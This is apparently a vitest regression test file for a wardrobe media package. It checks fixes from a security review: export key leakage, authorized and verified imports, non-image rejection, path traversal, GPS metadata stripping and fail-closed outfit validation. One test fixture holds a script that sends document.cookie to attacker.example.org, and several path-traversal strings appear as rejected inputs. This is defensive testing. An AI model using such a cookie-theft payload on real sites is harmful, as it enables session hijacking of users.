import { beforeAll, describe, expect, it } from "vitest";
import { all, isCommandError } from "@garderobe/domain";
import type { TestOwner } from "@garderobe/domain/testing";
import {
  exportMediaData, getAsset, getComposition, getGarmentMedia, getStudioSelectors, importMediaData, listMediaDeletions, MEDIA_RESPONSE_HEADERS, openRendition, readExportFile, requestCompositePreview, serveSignedMedia, signRenditionUrl,
  suggestStudioOutfits, validateStudioOutfit, type MediaExport,
} from "../src/index.ts";
import { encodeJpeg, probeImage } from "../src/image/index.ts";
import { createMediaHarness, syntheticShirt, syntheticTrousers, type MediaHarness } from "../src/testing/index.ts";

// Regression tests for the independent review of this package (findings M3, M4, M6 and L4 to L8).
// SYNTHETIC TEST IMAGES. "Real" garments here are test records of a non-synthetic test owner.

async function code(p: Promise<unknown>): Promise<string> {
  try {
    await p;
    return "ok";
  } catch (e) {
    return isCommandError(e) ? e.code : `threw:${String(e)}`;
  }
}
const sha256 = async (bytes: Uint8Array) => [...new Uint8Array(await crypto.subtle.digest("SHA-256", bytes))].map((b) => b.toString(16).padStart(2, "0")).join("");
const tokenOf = (url: string) => url.split("/").pop()!;

/** A JPEG carrying an Exif block with a GPS pointer (as a phone camera writes). */
function gpsTagged(jpg: Uint8Array): Uint8Array {
  const tiff = new Uint8Array(8 + 2 + 12 + 4 + 6);
  const v = new DataView(tiff.buffer);
  tiff.set([0x49, 0x49, 42, 0, 8, 0, 0, 0]);
  v.setUint16(8, 1, true);
  v.setUint16(10, 0x8825, true);
  v.setUint16(12, 4, true);
  v.setUint32(14, 1, true);
  v.setUint32(18, 26, true);
  const body = new Uint8Array([0x45, 0x78, 0x69, 0x66, 0, 0, ...tiff]);
  return new Uint8Array([...jpg.subarray(0, 2), 0xff, 0xe1, (body.length + 2) >> 8, (body.length + 2) & 0xff, ...body, ...jpg.subarray(2)]);
}

describe("review M3 and M4: exports carry no storage keys; an import is authorized and verified before it writes", () => {
  let h: MediaHarness;
  let source: TestOwner;
  let data: MediaExport;
  const importer = (o: TestOwner) => o.principal({ channel: "import", actor: "system", scopes: ["read", "write", "admin"] });
  const fromSource = (file: string) => readExportFile(h.rt, source.principal(), file);
  const objectsOf = async (o: TestOwner) => (await h.bindings.MEDIA_BUCKET.list({ prefix: `u/${o.userId}/` })).objects.map((x) => x.key);
  const record = (o: TestOwner, rows: Record<string, Record<string, unknown>[]>, key: string) =>
    h.service.execute(importer(o), { type: "media.import_records", payload: { part: "assets", rows }, idempotencyKey: key, expectedVersions: {}, authorization: "data_import", source: { channel: "import" } });

  beforeAll(async () => {
    h = await createMediaHarness();
    source = await h.createSyntheticOwner({ displayName: "Synthetic owner (M3/M4 source)" });
    await h.upload(source, { garmentId: "shirt-moss", raster: syntheticShirt({ size: 256 }), demo: true });
    const gone = await h.upload(source, { garmentId: "shirt-gold", raster: syntheticShirt({ size: 128 }), demo: true });
    await h.settle(source);
    await source.exec("media.delete_asset", { assetId: gone.asset!.assetId });
    await h.settle(source);
    data = await exportMediaData(h.rt, source.principal());
  });

  it("M3: neither the export nor the deletion journal returns a storage key or the owner's ID, and the journal is not for read-only connections", async () => {
    const readOnly = source.principal({ actor: "assistant", channel: "mcp", scopes: ["read"] });
    const exported = await exportMediaData(h.rt, readOnly);
    const journal = await listMediaDeletions(h.rt, source.principal());
    for (const text of [JSON.stringify(exported), JSON.stringify(journal)]) {
      expect(text).not.toContain(source.userId);
      expect(text).not.toMatch(/"u\/|object_key|objectKey|r2Key/);
    }
    expect(exported.assets.every((f) => /^assets\/[A-Za-z0-9_-]+\/[a-z]+-/.test(f.file))).toBe(true);
    expect(journal.deletedAssets[0]!.files.every((f) => f.startsWith("assets/"))).toBe(true);
    expect(await code(listMediaDeletions(h.rt, readOnly))).toBe("forbidden");

    // Files are read by package-relative path, and only ever the caller's own.
    const first_ = exported.assets[0]!;
    expect((await readExportFile(h.rt, readOnly, first_.file))!.byteLength).toBe(first_.byteLength);
    const stranger = await h.createSyntheticOwner({ displayName: "Synthetic owner (M3 stranger)" });
    expect(await readExportFile(h.rt, stranger.principal(), first_.file)).toBeNull(); // the same path under another owner: nothing there
    expect(await readExportFile(h.rt, stranger.principal(), `u/${source.userId}/${first_.file}`)).toBeNull(); // another owner's key is never read
    expect((await readExportFile(h.rt, source.principal(), `u/${source.userId}/${first_.file}`))!.byteLength).toBe(first_.byteLength); // one's own, in the earlier form
    for (const bad of [`../${source.userId}/${first_.file}`, `assets/../../${source.userId}/x`, "staging/x", "composites/x.png", "", "assets/a/b/c"]) expect(await readExportFile(h.rt, stranger.principal(), bad), bad).toBeNull();
    expect(await code(readExportFile(h.rt, source.principal({ scopes: [] }), first_.file))).toBe("forbidden");
  });

  it("M4a: without the import authorization nothing is read and nothing is written", async () => {
    for (const scopes of [["read"], ["read", "write"]] as const) {
      const target = await h.createSyntheticOwner({ displayName: `Synthetic owner (M4a ${scopes.join("+")})` });
      let reads = 0;
      const attempt = importMediaData(h.rt, target.principal({ scopes: [...scopes] }), data, async (file) => {
        reads++;
        return fromSource(file);
      });
      expect(await code(attempt)).toBe("forbidden");
      expect(reads).toBe(0);
      expect(await objectsOf(target)).toEqual([]);
      expect(await all(h.db, "SELECT 1 FROM media_assets WHERE user_id = ?", target.userId)).toHaveLength(0);
    }
  });

  it("M4b: a file that is not an image is rejected whatever the package calls it, and only image types are ever served", async () => {
    const target = await h.createSyntheticOwner({ displayName: "Synthetic owner (M4b)" });
    const page = new TextEncoder().encode("<html><script>fetch('https://attacker.example.org/?c='+document.cookie)</script></html>");
    const victim = data.assets.find((f) => f.kind === "catalogue")!;
    // A tampered package: the catalogue view's entry now points at an HTML page, consistently checksummed, once
    // declared as text/html and (in a second owner) once still claiming to be an image.
    const tampered = (contentType: string): MediaExport => ({
      ...data,
      assets: data.assets.map((f) => (f === victim ? { ...f, contentType, byteLength: page.length, sha256: hash } : f)),
      records: { ...data.records, renditions: data.records.renditions.map((r) => (r.rendition_id === victim.renditionId ? { ...r, content_type: contentType, byte_length: page.length, sha256: hash } : r)) },
    });
    const hash = await sha256(page);
    const read = (file: string) => (file === victim.file ? Promise.resolve(page) : fromSource(file));
    const result = await importMediaData(h.rt, importer(target), tampered("text/html"), read);
    expect(result.rejected).toEqual([victim.file]);
    expect(result.imported.files).toBe(data.assets.length - 1);
    expect((await objectsOf(target)).some((k) => k.endsWith(victim.file))).toBe(false); // the page was never stored
    expect(await all(h.db, "SELECT 1 FROM media_renditions WHERE user_id = ? AND rendition_id = ?", target.userId, victim.renditionId)).toHaveLength(0);
    const other = await h.createSyntheticOwner({ displayName: "Synthetic owner (M4b, lying type)" });
    expect((await importMediaData(h.rt, importer(other), tampered("image/jpeg"), read)).rejected).toEqual([victim.file]);
    // What was imported is typed by its bytes: every stored content type is an image type.
    const types = await all<{ content_type: string }>(h.db, "SELECT DISTINCT content_type FROM media_renditions WHERE user_id = ? AND status = 'active'", target.userId);
    expect(types.map((t) => t.content_type).sort()).toEqual(["image/png"]);

    // Defence in depth at delivery: a record that somehow claims another type is never served, and every
    // response, served or refused, forbids scripts, frames and sniffing.
    const rendition = (await getGarmentMedia(h.rt, target.principal(), "shirt-moss")).image.renditionId!;
    const token = tokenOf((await signRenditionUrl(h.rt, target.principal(), rendition)).url);
    const served = await serveSignedMedia(h.rt, token);
    expect(served.status).toBe(200);
    for (const [name, value] of Object.entries(MEDIA_RESPONSE_HEADERS)) expect(served.headers.get(name), name).toBe(value);
    expect(served.headers.get("content-security-policy")).toBe("default-src 'none'; sandbox");
    await served.arrayBuffer();
    await h.db.prepare("UPDATE media_renditions SET content_type = 'text/html' WHERE user_id = ? AND rendition_id = ?").bind(target.userId, rendition).run();
    const refused = await serveSignedMedia(h.rt, token);
    expect([refused.status, refused.headers.get("content-type"), refused.headers.get("content-security-policy")]).toEqual([404, "text/plain; charset=utf-8", "default-src 'none'; sandbox"]);
    expect(await code(openRendition(h.rt, target.principal(), rendition))).toBe("not_found");
  });

  it("M4c: an image record without a source, without a verified file, or as a demo placeholder on a real garment is refused", async () => {
    const real = await h.createOwner({ synthetic: false, displayName: "Non-synthetic owner (M4c, test records)" });
    await real.exec("garment.create", { garmentId: "real-shirt", name: "a real shirt (test record)", category: "shirt", roles: ["top"], careChannel: "service", acquisition: "owned", quantity: 1, source: { kind: "system", note: "test record" } });
    const now = h.clock.iso();
    const asset = (over: Record<string, unknown>) => ({ asset_id: "ast_fabricated_0001", garment_id: "real-shirt", kind: "exact_product_photo", is_demo: 0, status: "active", status_reason: null, source_json: JSON.stringify({ kind: "maker_catalogue", imageUrl: "https://img.example.org/x.jpg", pageUrl: "https://maker.example.org/x", retrievedAt: now, permittedUse: "private_catalogue_only", note: null }), match_evidence_json: "{}", derived_from_asset_id: null, had_location_metadata: 0, wearing_date: null, retain_original_until: null, original_purged_at: null, version: 1, created_at: now, updated_at: now, deleted_at: null, ...over });
    const rendition = (over: Record<string, unknown> = {}) => ({ rendition_id: "rnd_fabricated_0001", asset_id: "ast_fabricated_0001", kind: "original", version: 1, file: "assets/ast_fabricated_0001/original-0000000000000000.jpg", content_type: "image/jpeg", width: 800, height: 800, byte_length: 1234, sha256: "d".repeat(64), source_rendition_id: null, transformations_json: "[]", edited: 0, status: "active", created_at: now, ...over });
    const attempt = async (rows: Record<string, Record<string, unknown>[]>, key: string) => {
      try {
        await record(real, rows, key);
        return "ok";
      } catch (e) {
        return isCommandError(e) ? `${e.code}: ${e.message}` : `threw:${String(e)}`;
      }
    };
    // The reviewer's case: a "product photo" with an empty source and no file at all.
    expect(await attempt({ assets: [asset({ source_json: "{}" })] }, "m4c-empty-source-1")).toBe("invalid_command: image ast_fabricated_0001 does not say where it came from; it was not imported");
    expect(await attempt({ assets: [asset({ source_json: "not json" })] }, "m4c-bad-source-1")).toMatch(/does not say where it came from/);
    expect(await attempt({ assets: [asset({})] }, "m4c-no-file-0001")).toBe("invalid_command: image ast_fabricated_0001 has no verified file; it was not imported");
    // A file record whose bytes this import never verified and stored (nothing there; then something planted there).
    expect(await attempt({ assets: [asset({})], renditions: [rendition()] }, "m4c-unstored-0001")).toMatch(/^invalid_command: file rnd_fabricated_0001 was not verified and stored by this import/);
    const planted = encodeJpeg(syntheticShirt({ size: 128 }), 90);
    await h.bindings.MEDIA_BUCKET.put(`u/${real.userId}/assets/ast_fabricated_0001/original-0000000000000000.jpg`, planted, { httpMetadata: { contentType: "image/jpeg" } });
    expect(await attempt({ assets: [asset({})], renditions: [rendition({ byte_length: planted.length, sha256: await sha256(planted) })] }, "m4c-planted-0001")).toMatch(/was not verified and stored by this import/);
    expect(await attempt({ assets: [asset({})], renditions: [rendition({ content_type: "text/html" })] }, "m4c-html-type-01")).toBe("invalid_command: file rnd_fabricated_0001 is not an accepted image type");
    expect(await attempt({ assets: [asset({ kind: "owner_photo", is_demo: 1, source_json: JSON.stringify({ kind: "demo_fixture", imageUrl: null, pageUrl: null, retrievedAt: now, permittedUse: "demo_only", note: null }) })], renditions: [rendition()] }, "m4c-demo-on-real")).toBe("forbidden: image ast_fabricated_0001 is a demo placeholder and can only be attached to a synthetic fixture garment");
    expect(await attempt({ assets: [asset({ garment_id: "someone-elses-garment" })], renditions: [rendition()] }, "m4c-foreign-garm")).toMatch(/belongs to a garment that is not in this wardrobe/);
    expect(await attempt({ assets: [], renditions: [rendition()] }, "m4c-orphan-file1")).toMatch(/must belong to an image in the same import/);
    // Nothing got in: the garment still honestly has no image.
    expect(await all(h.db, "SELECT 1 FROM media_assets WHERE user_id = ?", real.userId)).toHaveLength(0);
    expect((await getGarmentMedia(h.rt, real.principal(), "real-shirt")).image).toMatchObject({ hasRealImage: false, assetId: null, missingImageNote: "No photo yet" });
  });

  it("L7: the database itself refuses the same things when a command is bypassed", async () => {
    const real = await h.createOwner({ synthetic: false, displayName: "Non-synthetic owner (L7, test records)" });
    await real.exec("garment.create", { garmentId: "real-shirt", name: "a real shirt (test record)", category: "shirt", roles: ["top"], careChannel: "service", acquisition: "owned", quantity: 1, source: { kind: "system", note: "test record" } });
    const now = h.clock.iso();
    const insert = (id: string, isDemo: number, source: string) =>
      h.db.prepare("INSERT INTO media_assets (user_id, asset_id, garment_id, kind, is_demo, status, source_json, match_evidence_json, version, command_id, created_at, updated_at) VALUES (?, ?, 'real-shirt', 'owner_photo', ?, 'active', ?, '{}', 1, 'cmd_direct', ?, ?)").bind(real.userId, id, isDemo, source, now, now).run();
    const good = JSON.stringify({ kind: "owner_upload", imageUrl: null, pageUrl: null, retrievedAt: now, permittedUse: "owner_owned", note: null });
    await expect(insert("ast_direct_demo", 1, good)).rejects.toThrow(/a demo placeholder can only be attached to a synthetic fixture garment/);
    await expect(insert("ast_direct_empty", 0, "{}")).rejects.toThrow(/source_json must say where the image came from/);
    await expect(insert("ast_direct_text", 0, "n/a")).rejects.toThrow(/source_json must say where the image came from/);
    await insert("ast_direct_ok", 0, good); // the rules do not get in the way of a proper record
    await expect(h.db.prepare("UPDATE media_assets SET is_demo = 1 WHERE user_id = ? AND asset_id = 'ast_direct_ok'").bind(real.userId).run()).rejects.toThrow(/demo placeholder/);
    await expect(h.db.prepare("UPDATE media_assets SET source_json = '[]' WHERE user_id = ? AND asset_id = 'ast_direct_ok'").bind(real.userId).run()).rejects.toThrow(/source_json/);
    // An outfit preview's SVG scene must sit inside its owner's prefix, like its PNG.
    const { manifestHash } = await requestCompositePreview(h.rt, source.principal(), { slots: [{ role: "top", garmentId: "shirt-moss" }, { role: "bottom", garmentId: "trouser-olive" }] });
    await h.settle(source);
    const setSvg = (key: string) => h.db.prepare("UPDATE outfit_composites SET svg_key = ? WHERE user_id = ? AND manifest_hash = ?").bind(key, source.userId, manifestHash).run();
    await expect(setSvg(`u/${real.userId}/composites/${manifestHash}.svg`)).rejects.toThrow(/svg_key must be inside the owner prefix/);
    await expect(setSvg("composites/x.svg")).rejects.toThrow(/svg_key must be inside the owner prefix/);
    await setSvg(`u/${source.userId}/composites/${manifestHash}.svg`);
  });
});

describe("review M6, L4, L5, L6: what a link or a read may carry", () => {
  let h: MediaHarness;
  let owner: TestOwner;

  beforeAll(async () => {
    h = await createMediaHarness();
    owner = await h.createSyntheticOwner({ displayName: "Synthetic owner (M6/L4-L6)" });
  });

  it("M6: the GPS-tagged original is never linked outside the app; derived copies carry no metadata", async () => {
    const tagged = gpsTagged(encodeJpeg(syntheticShirt({ size: 256 }), 92));
    expect(probeImage(tagged)!.exif.hasGps).toBe(true);
    const up = await h.upload(owner, { garmentId: "shirt-moss", bytes: tagged, contentType: "image/jpeg", demo: true });
    await h.settle(owner);
    const asset = await getAsset(h.rt, owner.principal(), up.asset!.assetId);
    expect(asset.hadLocationMetadata).toBe(true);
    const original = asset.renditions.find((r) => r.kind === "original")!.renditionId;
    for (const audience of ["calendar", "provider"] as const) {
      const attempt = signRenditionUrl(h.rt, owner.principal(), original, { audience }).catch((e) => e);
      const error = await attempt;
      expect(isCommandError(error) && [error.code, error.message]).toEqual(["forbidden", "the original photograph is never linked outside the app; only a derived copy without metadata can be"]);
    }
    // The derived copies can be linked, and none of them carries the position.
    for (const kind of ["cutout", "catalogue"] as const) {
      const rendition = asset.renditions.find((r) => r.kind === kind)!.renditionId;
      const response = await serveSignedMedia(h.rt, tokenOf((await signRenditionUrl(h.rt, owner.principal(), rendition, { audience: "calendar" })).url));
      expect(response.status).toBe(200);
      expect(probeImage(new Uint8Array(await response.arrayBuffer()))!.exif).toMatchObject({ hasGps: false });
    }
    // The owner's own app may still open the original (short-lived, owner-scoped).
    const own = await serveSignedMedia(h.rt, tokenOf((await signRenditionUrl(h.rt, owner.principal(), original)).url));
    expect(own.status).toBe(200);
    await own.arrayBuffer();
  });

  it("L4: a link lifetime that is not a number is refused, not thrown", async () => {
    const rendition = (await getGarmentMedia(h.rt, owner.principal(), "shirt-moss")).image.renditionId!;
    for (const ttlSeconds of [Number.NaN, Number.POSITIVE_INFINITY, Number.NEGATIVE_INFINITY, "300" as unknown as number]) {
      expect(await code(signRenditionUrl(h.rt, owner.principal(), rendition, { ttlSeconds })), String(ttlSeconds)).toBe("invalid_command");
    }
    expect(Date.parse((await signRenditionUrl(h.rt, owner.principal(), rendition, { ttlSeconds: 120 })).expiresAt) - h.clock.now()).toBe(120_000);
  });

  it("L5 and L6: after a deletion the stored composition shows the image as missing and the deleted image's metadata is gone", async () => {
    await h.upload(owner, { garmentId: "trouser-olive", raster: syntheticTrousers({ size: 256 }), demo: true });
    await h.settle(owner);
    const slots = [{ role: "top" as const, garmentId: "shirt-moss" }, { role: "bottom" as const, garmentId: "trouser-olive" }];
    const { manifestHash } = await requestCompositePreview(h.rt, owner.principal(), { slots });
    await h.settle(owner);
    const before = await getComposition(h.rt, owner.principal(), manifestHash);
    expect(before.missingImages).toEqual([]);
    const shirt = (await getGarmentMedia(h.rt, owner.principal(), "shirt-moss")).image;
    await owner.exec("media.delete_asset", { assetId: shirt.assetId });
    await h.settle(owner);

    const after = await getComposition(h.rt, owner.principal(), manifestHash);
    expect(after.preview).toMatchObject({ state: "none", failure: "an image it used was deleted" });
    expect(after.missingImages).toEqual(["shirt-moss"]);
    expect(after.labels).toContain("No photo yet");
    expect(after.manifest.layers.find((l) => l.garmentId === "shirt-moss")).toMatchObject({ imageLabel: "missing", assetId: null, renditionId: null, renditionVersion: null, renditionSha256: null, name: "moss lightweight oxford" });
    expect(after.manifest.layers.find((l) => l.garmentId === "trouser-olive")).toMatchObject({ imageLabel: "demo_placeholder", renditionId: expect.any(String) }); // the other piece is untouched
    expect(JSON.stringify(after)).not.toContain(shirt.renditionSha256!);
    expect(await code(getAsset(h.rt, owner.principal(), shirt.assetId!))).toBe("not_found");
  });
});

describe("review L8: Studio fails closed without the daily service's validator", () => {
  const OUTFIT = [{ role: "top" as const, garmentId: "shirt-moss" }, { role: "bottom" as const, garmentId: "trouser-olive" }, { role: "footwear" as const, garmentId: "shoe-navy" }];

  it("refuses to validate, suggest, save or plan rather than judge by weaker rules", async () => {
    const h = await createMediaHarness(); // no validator injected
    const owner = await h.createSyntheticOwner({ displayName: "Synthetic owner (L8, no validator)" });
    const refused = "outfit validation is not configured (the daily service's validator is missing), so this outfit cannot be checked against the owner's rules; nothing was written";
    const message = async (p: Promise<unknown>) => p.then(() => "ok", (e) => (isCommandError(e) ? `${e.code}: ${e.message}` : `threw:${String(e)}`));
    expect(await message(validateStudioOutfit(h.rt, owner.principal(), { slots: OUTFIT, mode: "for_today" }))).toBe(`precondition_failed: ${refused}`);
    expect(await message(validateStudioOutfit(h.rt, owner.principal(), { slots: OUTFIT, mode: "explore" }))).toBe(`precondition_failed: ${refused}`);
    expect(await message(suggestStudioOutfits(h.rt, owner.principal(), { slots: [], mode: "for_today" }))).toBe(`precondition_failed: ${refused}`);
    // The sockless outfit the baseline rules would have let through cannot be saved or planned.
    expect(await message(owner.exec("studio.save_combination", { slots: OUTFIT, mode: "for_today" }))).toBe(`precondition_failed: ${refused}`);
    expect(await message(owner.exec("studio.plan_for_day", { localDate: "2026-09-16", slots: OUTFIT }))).toBe(`precondition_failed: ${refused}`);
    expect(await all(h.db, "SELECT 1 FROM studio_combinations WHERE user_id = ?", owner.userId)).toHaveLength(0);
    expect(await all(h.db, "SELECT 1 FROM studio_day_plans WHERE user_id = ?", owner.userId)).toHaveLength(0);
    // Browsing still works; it simply offers no starting outfit it could not vouch for.
    const selectors = await getStudioSelectors(h.rt, owner.principal(), { mode: "for_today" });
    expect(selectors.opening).toEqual([]);
    expect(selectors.selectors.find((s) => s.role === "top")!.items.length).toBeGreaterThan(0);
  });

  it("uses the baseline rules only when they were explicitly accepted, and says so on every verdict", async () => {
    const h = await createMediaHarness({ adapters: { allowBaselineValidator: true } });
    const owner = await h.createSyntheticOwner({ displayName: "Synthetic owner (L8, baseline accepted)" });
    const verdict = await validateStudioOutfit(h.rt, owner.principal(), { slots: OUTFIT, mode: "for_today" });
    expect(verdict).toMatchObject({ valid: true, validator: "media-baseline" });
    const saved = await owner.exec("studio.save_combination", { slots: OUTFIT, mode: "for_today" });
    expect(saved.result).toMatchObject({ validation: { validator: "media-baseline" } });
  });
});
